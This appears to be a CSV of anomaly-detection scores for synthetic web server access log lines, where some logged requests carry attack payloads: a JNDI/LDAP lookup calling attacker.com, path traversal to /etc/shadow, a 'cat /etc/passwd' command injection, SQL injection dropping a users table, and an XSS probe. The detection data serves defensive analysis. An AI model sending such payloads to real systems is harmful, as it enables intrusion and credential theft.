score_content,score_session,score_fused,score_fused_norm,line
2.025946855545044,,2.025946855545044,2.025946855545044,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.098740339279175,,2.098740339279175,2.098740339279175,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.905913233757019,,1.905913233757019,1.905913233757019,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
24.353593826293945,,24.353593826293945,24.353593826293945,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.34969067573547363,,0.34969067573547363,0.34969067573547363,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.774200439453125,,1.774200439453125,1.774200439453125,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.197812795639038,,3.197812795639038,3.197812795639038,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.23877499997615814,,0.23877499997615814,0.23877499997615814,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
5.165655136108398,,5.165655136108398,5.165655136108398,119.173.185.140 - - [10/Jan/2025:12:05:14 +0000] "GET / HTTP/1.1" 302 9876 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.41399574279785,,24.41399574279785,24.41399574279785,71.49.240.225 - - [10/Jan/2025:12:05:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 5183 "-" "sqlmap/1.5.10#stable"
24.39733123779297,,24.39733123779297,24.39733123779297,62.53.18.26 - - [10/Jan/2025:12:05:17 +0000] "GET /search?q=phone HTTP/1.1" 201 612 "-" "python-requests/2.31.0"
0.30984219908714294,,0.30984219908714294,0.30984219908714294,103.113.60.139 - - [10/Jan/2025:12:05:20 +0000] "GET /index.html HTTP/1.1" 200 1549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.065291166305542,,2.065291166305542,2.065291166305542,82.148.154.198 - - [10/Jan/2025:12:05:21 +0000] "GET /logout HTTP/1.1" 200 18977 "https://example.com/" "sqlmap/1.5.10#stable"
11037.4130859375,,11037.4130859375,11037.4130859375,57.106.77.71 - - [10/Jan/2025:12:05:22 +0000] "GET /assets/app.css HTTP/1.1" 502 1067 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.278147429227829,,0.278147429227829,0.278147429227829,143.127.13.249 - - [10/Jan/2025:12:05:26 +0000] "GET /assets/app.js HTTP/1.1" 201 14098 "https://news.ycombinator.com/" "curl/7.68.0"
24.42719841003418,,24.42719841003418,24.42719841003418,97.48.194.138 - - [10/Jan/2025:12:05:30 +0000] "GET /search?q=phone HTTP/1.1" 200 9926 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.1190879344940186,,3.1190879344940186,3.1190879344940186,144.106.248.107 - - [10/Jan/2025:12:05:31 +0000] "GET /assets/app.css HTTP/1.1" 304 1988 "https://twitter.com/" "python-requests/2.31.0"
2.0356667041778564,,2.0356667041778564,2.0356667041778564,237.116.217.95 - - [10/Jan/2025:12:05:32 +0000] "GET /login HTTP/1.1" 200 2690 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.383667916059494,,0.383667916059494,0.383667916059494,155.11.224.19 - - [10/Jan/2025:12:05:37 +0000] "GET /index.html HTTP/1.1" 200 19923 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9339861869812012,,1.9339861869812012,1.9339861869812012,78.245.233.4 - - [10/Jan/2025:12:05:42 +0000] "GET /api/products HTTP/1.1" 200 11010 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30148.935546875,,30148.935546875,30148.935546875,155.181.53.102 - - [10/Jan/2025:12:05:47 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 1424 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.411954879760742,,24.411954879760742,24.411954879760742,79.67.93.132 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=laptop HTTP/1.1" 200 11872 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
27.20391082763672,,27.20391082763672,27.20391082763672,235.53.95.81 - - [10/Jan/2025:12:05:49 +0000] "GET /search?q=headphones HTTP/1.1" 302 10593 "-" "Wget/1.20.3 (linux-gnu)"
0.2690252959728241,,0.2690252959728241,0.2690252959728241,240.150.149.185 - - [10/Jan/2025:12:05:53 +0000] "GET /assets/app.css HTTP/1.1" 200 18230 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.4287052154541,,24.4287052154541,24.4287052154541,128.141.168.242 - - [10/Jan/2025:12:05:54 +0000] "GET /api/product?id=123 HTTP/1.1" 200 8152 "https://example.com/" "sqlmap/1.5.10#stable"
11061.388671875,,11061.388671875,11061.388671875,190.126.118.44 - - [10/Jan/2025:12:05:56 +0000] "GET /search?q=headphones HTTP/1.1" 500 1314 "https://example.com/" "sqlmap/1.5.10#stable"
24.644996643066406,,24.644996643066406,24.644996643066406,254.165.246.16 - - [10/Jan/2025:12:05:57 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0611510276794434,,2.0611510276794434,2.0611510276794434,18.182.39.3 - - [10/Jan/2025:12:06:02 +0000] "GET /admin HTTP/1.1" 200 7683 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.293231964111328,,24.293231964111328,24.293231964111328,2.137.142.106 - - [10/Jan/2025:12:06:05 +0000] "GET /search?q=headphones HTTP/1.1" 204 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0496368408203125,,2.0496368408203125,2.0496368408203125,207.241.233.46 - - [10/Jan/2025:12:06:09 +0000] "GET /logout HTTP/1.1" 200 14209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.247901916503906,,24.247901916503906,24.247901916503906,209.91.69.204 - - [10/Jan/2025:12:06:13 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 201 8371 "-" "dirb/2.22"
24.393035888671875,,24.393035888671875,24.393035888671875,77.176.212.218 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=camera HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.365800857543945,,24.365800857543945,24.365800857543945,164.3.180.44 - - [10/Jan/2025:12:06:15 +0000] "GET /search?q=laptop HTTP/1.1" 200 1938 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8950438499450684,,1.8950438499450684,1.8950438499450684,230.136.236.11 - - [10/Jan/2025:12:06:18 +0000] "GET /dashboard HTTP/1.1" 200 3224 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.291837692260742,,24.291837692260742,24.291837692260742,176.237.72.231 - - [10/Jan/2025:12:06:23 +0000] "GET /search?q=headphones HTTP/1.1" 200 2536 "https://twitter.com/" "python-requests/2.31.0"
24.412681579589844,,24.412681579589844,24.412681579589844,151.37.193.211 - - [10/Jan/2025:12:06:28 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6888 "-" "dirb/2.22"
24.448278427124023,,24.448278427124023,24.448278427124023,174.230.139.85 - - [10/Jan/2025:12:06:30 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12851 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
2.0137526988983154,,2.0137526988983154,2.0137526988983154,60.215.20.88 - - [10/Jan/2025:12:06:35 +0000] "GET /profile HTTP/1.1" 200 14422 "https://twitter.com/" "python-requests/2.31.0"
1.9242603778839111,,1.9242603778839111,1.9242603778839111,201.116.126.59 - - [10/Jan/2025:12:06:39 +0000] "GET /dashboard HTTP/1.1" 200 9056 "https://twitter.com/" "curl/7.68.0"
24.403362274169922,,24.403362274169922,24.403362274169922,205.64.183.19 - - [10/Jan/2025:12:06:42 +0000] "GET /search?q=laptop HTTP/1.1" 200 9778 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.1197240352630615,,3.1197240352630615,3.1197240352630615,93.28.24.2 - - [10/Jan/2025:12:06:43 +0000] "GET /assets/app.css HTTP/1.1" 302 10476 "https://news.ycombinator.com/" "curl/7.68.0"
1.9791029691696167,,1.9791029691696167,1.9791029691696167,111.115.143.143 - - [10/Jan/2025:12:06:45 +0000] "GET /contact HTTP/1.1" 200 6240 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.38805389404297,,24.38805389404297,24.38805389404297,154.201.84.222 - - [10/Jan/2025:12:06:45 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 19660 "-" "dirb/2.22"
4.979753494262695,,4.979753494262695,4.979753494262695,232.251.63.147 - - [10/Jan/2025:12:06:47 +0000] "GET /about HTTP/1.1" 302 18434 "https://www.google.com/" "python-requests/2.31.0"
0.23448167741298676,,0.23448167741298676,0.23448167741298676,127.38.17.43 - - [10/Jan/2025:12:06:52 +0000] "GET /assets/app.css HTTP/1.1" 200 8895 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
2.0634820461273193,,2.0634820461273193,2.0634820461273193,185.161.127.153 - - [10/Jan/2025:12:06:55 +0000] "GET /about HTTP/1.1" 200 8180 "https://www.google.com/" "python-requests/2.31.0"
24.449079513549805,,24.449079513549805,24.449079513549805,86.216.159.98 - - [10/Jan/2025:12:06:58 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13066 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.27396300435066223,,0.27396300435066223,0.27396300435066223,243.178.52.123 - - [10/Jan/2025:12:07:00 +0000] "GET /assets/app.css HTTP/1.1" 200 19866 "https://www.google.com/" "curl/7.68.0"
4.934244155883789,,4.934244155883789,4.934244155883789,248.148.201.63 - - [10/Jan/2025:12:07:03 +0000] "GET /logout HTTP/1.1" 302 16189 "https://news.ycombinator.com/" "curl/7.68.0"
24.43511390686035,,24.43511390686035,24.43511390686035,52.152.140.47 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 18576 "https://twitter.com/" "sqlmap/1.5.10#stable"
30149.8359375,,30149.8359375,30149.8359375,113.205.75.213 - - [10/Jan/2025:12:07:05 +0000] "GET /search?q=camera HTTP/1.1" 429 429 "-" "sqlmap/1.5.10#stable"
0.22853673994541168,,0.22853673994541168,0.22853673994541168,65.169.40.184 - - [10/Jan/2025:12:07:08 +0000] "GET /assets/app.css HTTP/1.1" 201 8030 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.356117248535156,,24.356117248535156,24.356117248535156,130.237.236.223 - - [10/Jan/2025:12:07:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 17610 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
27.23516082763672,,27.23516082763672,27.23516082763672,153.164.235.22 - - [10/Jan/2025:12:07:12 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 17693 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21846109628677368,,0.21846109628677368,0.21846109628677368,145.252.166.174 - - [10/Jan/2025:12:07:17 +0000] "GET /assets/app.js HTTP/1.1" 204 1551 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.394798278808594,,24.394798278808594,24.394798278808594,67.57.131.192 - - [10/Jan/2025:12:07:19 +0000] "GET /search?q=phone HTTP/1.1" 200 3331 "https://twitter.com/" "python-requests/2.31.0"
24.448522567749023,,24.448522567749023,24.448522567749023,119.198.174.151 - - [10/Jan/2025:12:07:23 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12916 "https://twitter.com/" "sqlmap/1.5.10#stable"
2.287487268447876,,2.287487268447876,2.287487268447876,107.236.247.22 - - [10/Jan/2025:12:07:24 +0000] "GET / HTTP/1.1" 200 9780 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.343812942504883,,27.343812942504883,27.343812942504883,124.90.122.25 - - [10/Jan/2025:12:07:26 +0000] "GET /search?q=camera HTTP/1.1" 304 17175 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
3.179083824157715,,3.179083824157715,3.179083824157715,6.218.88.166 - - [10/Jan/2025:12:07:28 +0000] "GET /wp-login.php HTTP/1.1" 304 3871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.26810190081596375,,0.26810190081596375,0.26810190081596375,144.110.246.119 - - [10/Jan/2025:12:07:33 +0000] "GET /assets/app.js HTTP/1.1" 200 10945 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.41167449951172,,24.41167449951172,24.41167449951172,116.152.110.100 - - [10/Jan/2025:12:07:38 +0000] "GET /search?q=phone HTTP/1.1" 200 6565 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0996439456939697,,2.0996439456939697,2.0996439456939697,48.94.84.51 - - [10/Jan/2025:12:07:39 +0000] "GET /about HTTP/1.1" 200 17692 "-" "Wget/1.20.3 (linux-gnu)"
24.329877853393555,,24.329877853393555,24.329877853393555,153.100.157.101 - - [10/Jan/2025:12:07:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 10369 "-" "python-requests/2.31.0"
24.401643753051758,,24.401643753051758,24.401643753051758,236.158.152.22 - - [10/Jan/2025:12:07:43 +0000] "GET /search?q=camera HTTP/1.1" 201 9846 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.446306228637695,,24.446306228637695,24.446306228637695,178.37.131.100 - - [10/Jan/2025:12:07:45 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 12332 "https://twitter.com/" "dirb/2.22"
24.455615997314453,,24.455615997314453,24.455615997314453,178.236.166.239 - - [10/Jan/2025:12:07:46 +0000] "GET /search?q=phone HTTP/1.1" 200 17708 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.25803253054618835,,0.25803253054618835,0.25803253054618835,159.14.222.92 - - [10/Jan/2025:12:07:47 +0000] "GET /assets/app.css HTTP/1.1" 200 14878 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11061.4677734375,,11061.4677734375,11061.4677734375,168.127.105.176 - - [10/Jan/2025:12:07:48 +0000] "GET /search?q=laptop HTTP/1.1" 500 1035 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.359277725219727,,24.359277725219727,24.359277725219727,8.204.195.57 - - [10/Jan/2025:12:07:53 +0000] "GET /search?q=headphones HTTP/1.1" 200 18626 "-" "curl/7.68.0"
2.0527141094207764,,2.0527141094207764,2.0527141094207764,145.191.198.197 - - [10/Jan/2025:12:07:55 +0000] "GET /logout HTTP/1.1" 200 15085 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.34761399030685425,,0.34761399030685425,0.34761399030685425,211.254.94.139 - - [10/Jan/2025:12:07:59 +0000] "GET /.git/config HTTP/1.1" 200 17896 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.419580459594727,,24.419580459594727,24.419580459594727,77.224.9.116 - - [10/Jan/2025:12:08:03 +0000] "GET /search?q=phone HTTP/1.1" 200 8211 "https://example.com/" "curl/7.68.0"
4.904820919036865,,4.904820919036865,4.904820919036865,54.208.189.151 - - [10/Jan/2025:12:08:03 +0000] "GET /contact HTTP/1.1" 304 7864 "https://example.com/" "sqlmap/1.5.10#stable"
24.401823043823242,,24.401823043823242,24.401823043823242,201.53.209.53 - - [10/Jan/2025:12:08:08 +0000] "GET /search?q=phone HTTP/1.1" 200 4662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26283594965934753,,0.26283594965934753,0.26283594965934753,75.147.69.244 - - [10/Jan/2025:12:08:10 +0000] "GET /assets/app.js HTTP/1.1" 200 9689 "-" "python-requests/2.31.0"
30148.755859375,,30148.755859375,30148.755859375,222.168.33.180 - - [10/Jan/2025:12:08:11 +0000] "GET /search?q=phone HTTP/1.1" 404 567 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.321582794189453,,27.321582794189453,27.321582794189453,126.37.148.162 - - [10/Jan/2025:12:08:12 +0000] "GET /api/product?id=123 HTTP/1.1" 302 12968 "https://news.ycombinator.com/" "curl/7.68.0"
2.068169593811035,,2.068169593811035,2.068169593811035,178.240.225.95 - - [10/Jan/2025:12:08:15 +0000] "GET /about HTTP/1.1" 200 9216 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.96895170211792,,4.96895170211792,4.96895170211792,163.171.179.92 - - [10/Jan/2025:12:08:17 +0000] "GET /about HTTP/1.1" 302 15122 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.58203125,,30148.58203125,30148.58203125,69.83.213.73 - - [10/Jan/2025:12:08:20 +0000] "GET /search?q=phone HTTP/1.1" 400 1013 "https://twitter.com/" "curl/7.68.0"
27.490880966186523,,27.490880966186523,27.490880966186523,12.26.161.201 - - [10/Jan/2025:12:08:24 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 1686 "-" "nikto/2.5.0"
0.30140429735183716,,0.30140429735183716,0.30140429735183716,254.246.110.52 - - [10/Jan/2025:12:08:24 +0000] "GET /assets/app.js HTTP/1.1" 200 122 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0793676376342773,,2.0793676376342773,2.0793676376342773,65.22.96.171 - - [10/Jan/2025:12:08:29 +0000] "GET /login HTTP/1.1" 200 11910 "https://www.google.com/" "sqlmap/1.5.10#stable"
4.900994300842285,,4.900994300842285,4.900994300842285,110.168.24.181 - - [10/Jan/2025:12:08:29 +0000] "GET /logout HTTP/1.1" 302 7772 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2655274569988251,,0.2655274569988251,0.2655274569988251,175.114.3.3 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.css HTTP/1.1" 200 17121 "https://example.com/" "sqlmap/1.5.10#stable"
27.302684783935547,,27.302684783935547,27.302684783935547,19.59.99.23 - - [10/Jan/2025:12:08:30 +0000] "GET /search?q=phone HTTP/1.1" 301 15753 "-" "sqlmap/1.5.10#stable"
2.0064401626586914,,2.0064401626586914,2.0064401626586914,165.174.37.18 - - [10/Jan/2025:12:08:30 +0000] "GET /logout HTTP/1.1" 200 4462 "https://twitter.com/" "python-requests/2.31.0"
0.2508673667907715,,0.2508673667907715,0.2508673667907715,161.192.39.236 - - [10/Jan/2025:12:08:30 +0000] "GET /assets/app.js HTTP/1.1" 200 7081 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.8973380327224731,,1.8973380327224731,1.8973380327224731,36.193.32.151 - - [10/Jan/2025:12:08:35 +0000] "GET /api/products HTTP/1.1" 200 3392 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.838244915008545,,4.838244915008545,4.838244915008545,71.166.22.64 - - [10/Jan/2025:12:08:37 +0000] "GET /dashboard HTTP/1.1" 304 8219 "https://twitter.com/" "python-requests/2.31.0"
4.9145827293396,,4.9145827293396,4.9145827293396,218.217.169.225 - - [10/Jan/2025:12:08:41 +0000] "GET /logout HTTP/1.1" 304 978 "https://www.google.com/" "curl/7.68.0"
4.806612491607666,,4.806612491607666,4.806612491607666,166.14.201.230 - - [10/Jan/2025:12:08:45 +0000] "GET /api/products HTTP/1.1" 302 9784 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.577251434326172,,24.577251434326172,24.577251434326172,136.228.251.4 - - [10/Jan/2025:12:08:48 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 201 2426 "https://example.com/" "sqlmap/1.5.10#stable"
24.4075927734375,,24.4075927734375,24.4075927734375,196.121.245.253 - - [10/Jan/2025:12:08:49 +0000] "GET /search?q=phone HTTP/1.1" 200 5761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.544023513793945,,24.544023513793945,24.544023513793945,243.203.102.130 - - [10/Jan/2025:12:08:53 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2081 "https://twitter.com/" "python-requests/2.31.0"
24.432334899902344,,24.432334899902344,24.432334899902344,138.158.40.72 - - [10/Jan/2025:12:08:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 17682 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11039.0087890625,,11039.0087890625,11039.0087890625,138.84.101.151 - - [10/Jan/2025:12:08:56 +0000] "GET /api/products HTTP/1.1" 500 318 "-" "sqlmap/1.5.10#stable"
24.402137756347656,,24.402137756347656,24.402137756347656,237.112.30.117 - - [10/Jan/2025:12:08:58 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2925 "https://twitter.com/" "python-requests/2.31.0"
0.23810698091983795,,0.23810698091983795,0.23810698091983795,180.3.42.128 - - [10/Jan/2025:12:08:58 +0000] "GET /assets/app.js HTTP/1.1" 200 4596 "https://twitter.com/" "curl/7.68.0"
2.043678045272827,,2.043678045272827,2.043678045272827,192.200.224.69 - - [10/Jan/2025:12:09:02 +0000] "GET /login HTTP/1.1" 200 4259 "-" "sqlmap/1.5.10#stable"
24.38972282409668,,24.38972282409668,24.38972282409668,68.183.250.148 - - [10/Jan/2025:12:09:02 +0000] "GET /search?q=phone HTTP/1.1" 200 2192 "-" "sqlmap/1.5.10#stable"
2.0277302265167236,,2.0277302265167236,2.0277302265167236,43.95.41.66 - - [10/Jan/2025:12:09:05 +0000] "GET /profile HTTP/1.1" 200 18675 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.325101852416992,,27.325101852416992,27.325101852416992,12.220.221.4 - - [10/Jan/2025:12:09:10 +0000] "GET /api/product?id=123 HTTP/1.1" 302 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.20092682540416718,,0.20092682540416718,0.20092682540416718,142.206.234.183 - - [10/Jan/2025:12:09:13 +0000] "GET /assets/app.css HTTP/1.1" 200 1258 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30148.751953125,,30148.751953125,30148.751953125,70.212.20.147 - - [10/Jan/2025:12:09:14 +0000] "GET /search?q=phone HTTP/1.1" 404 655 "-" "curl/7.68.0"
0.37467822432518005,,0.37467822432518005,0.37467822432518005,252.12.245.103 - - [10/Jan/2025:12:09:18 +0000] "GET /index.html HTTP/1.1" 200 17000 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0629806518554688,,2.0629806518554688,2.0629806518554688,117.3.95.52 - - [10/Jan/2025:12:09:20 +0000] "GET /logout HTTP/1.1" 200 18223 "https://twitter.com/" "curl/7.68.0"
24.47039794921875,,24.47039794921875,24.47039794921875,249.127.198.199 - - [10/Jan/2025:12:09:22 +0000] "GET /api/product?id=123 HTTP/1.1" 200 19488 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.4560489654541,,24.4560489654541,24.4560489654541,89.163.215.178 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=phone HTTP/1.1" 200 17845 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.595703125,,30148.595703125,30148.595703125,79.27.53.136 - - [10/Jan/2025:12:09:23 +0000] "GET /search?q=laptop HTTP/1.1" 401 1489 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.083900213241577,,3.083900213241577,3.083900213241577,12.236.60.230 - - [10/Jan/2025:12:09:26 +0000] "GET /assets/app.css HTTP/1.1" 302 3148 "https://news.ycombinator.com/" "python-requests/2.31.0"
11061.5244140625,,11061.5244140625,11061.5244140625,149.25.130.35 - - [10/Jan/2025:12:09:31 +0000] "GET /search?q=camera HTTP/1.1" 500 173 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.3216581642627716,,0.3216581642627716,0.3216581642627716,61.75.67.218 - - [10/Jan/2025:12:09:31 +0000] "GET /index.html HTTP/1.1" 200 4383 "https://news.ycombinator.com/" "curl/7.68.0"
1.9240601062774658,,1.9240601062774658,1.9240601062774658,60.20.242.52 - - [10/Jan/2025:12:09:36 +0000] "GET /dashboard HTTP/1.1" 200 9011 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
